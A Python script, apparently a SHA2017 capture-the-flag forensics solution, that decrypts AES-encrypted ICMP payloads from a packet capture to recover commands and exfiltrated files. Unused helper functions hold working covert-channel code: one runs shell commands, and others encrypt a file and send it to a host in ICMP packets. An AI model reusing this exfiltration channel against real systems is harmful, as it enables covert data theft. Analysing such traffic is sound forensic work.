import base64
import sys
import time
import subprocess
import threading

from Crypto import Random
from Crypto.Cipher import AES
from scapy.all import *

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]
magic = "SHA2017"


class AESCipher:

    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))

def run_command(cmd):
    ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    output = ps.communicate()[0]
    return output

def send_ping(host, magic, data):
    data = cipher.encrypt(data)
    load = "{}:{}".format(magic, data)
    time.sleep(1)
    sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)

def chunks(L, n):
    for i in xrange(0, len(L), n):
        yield L[i:i+n]

def get_file(host, magic, fn):
    time.sleep(1)
    data = base64.urlsafe_b64encode(open(fn, "rb").read())
    cnt = 0
    icmp_threads = []
    for line in chunks(data, 500):
        t = threading.Thread(target = send_ping, args = (host,magic, "getfile:{}:{}".format(cnt,line)))
        t.daemon = True
        t.start()
        icmp_threads.append(t)
        cnt += 1

    for t in icmp_threads:
        t.join()


cipher = AESCipher('K8djhaIU8H2d1jNb')
f = sys.argv[1]

pkts = rdpcap(f)

chunks = {}
i = 0
fname = ""

def save_chunks():
    global chunks, i, fname
    print("save " + fname)
    result = ''
    for x in sorted(chunks.keys()):
        result += chunks[x]
    b = base64.urlsafe_b64decode(result)
    open(fname, 'wb').write(b)
    chunks = {}

for packet in pkts:
    input = packet[IP].load
    if input[0:len(magic)] == magic:
        input = input.split(":")
        data = cipher.decrypt(input[1]).split(":")
        if data[0]=='command':
            print(data[1])
        if data[0]=='getfile':
            if len(data)>=3:
                #print("2: " + data[2])
                chunks[int(data[1])] = data[2]
            else:
                i += 1
                if i == 3:
                    print("save array: " + str(len(chunks)))
                    fname = "file1.pcap"
                    save_chunks()
                    i=0
print("save array: " + str(len(chunks)))
fname = "file2.pcap"
save_chunks()
